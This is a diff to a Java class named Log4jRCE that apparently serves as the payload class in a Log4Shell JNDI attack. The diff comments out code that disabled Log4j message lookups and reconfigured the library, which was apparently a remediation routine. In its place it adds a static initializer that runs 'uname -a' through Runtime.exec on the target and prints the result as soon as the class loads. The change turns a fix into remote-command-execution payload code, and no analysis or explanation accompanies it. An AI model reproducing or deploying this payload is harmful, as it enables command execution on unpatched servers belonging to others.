@@ -19,16 +19,10 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 
 
-
-
 public class Log4jRCE {
     static {
         try {
-            try { // Try for versions of Log4j >= 2.10
-              //Class<?> c = Thread.currentThread().getContextClassLoader().loadClass("org.apache.logging.log4j.core.util.Constants");
-              //Field field = c.getField("FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS");
-              //System.out.println("Setting " + field.getName() + " value to True");
-              //setFinalStatic(field, Boolean.TRUE);
+	    try { // Try for versions of Log4j >= 2.10
               Runtime runtime = Runtime.getRuntime();
               String computerInfo = getCmdResultString(runtime.exec("uname -a"));
               System.out.println(computerInfo);
@@ -37,10 +31,16 @@ public class Log4jRCE {
 	    } catch (IOException e) {
 	       e.printStackTrace();
 	    }
-            //} catch (NoSuchFieldException e) { // Fall back to older versions. Try to make JNDI non instantiable
-            //    System.err.println("No field FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS - version <= 2.9.0");
-            //    System.err.println("Will attempt to modify the configuration directly");
-            //}
+	/*
+            try { // Try for versions of Log4j >= 2.10
+              Class<?> c = Thread.currentThread().getContextClassLoader().loadClass("org.apache.logging.log4j.core.util.Constants");
+              Field field = c.getField("FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS");
+              System.out.println("Setting " + field.getName() + " value to True");
+              setFinalStatic(field, Boolean.TRUE);
+            } catch (NoSuchFieldException e) { // Fall back to older versions. Try to make JNDI non instantiable
+               System.err.println("No field FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS - version <= 2.9.0");
+               System.err.println("Will attempt to modify the configuration directly");
+            }
 
             //reconfiguring log4j
             ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
@@ -75,6 +75,7 @@ public class Log4jRCE {
                     }
                 }
             }
+	*/
         } catch (Exception e) {
             System.err.println("Exception " + e);
             e.printStackTrace();
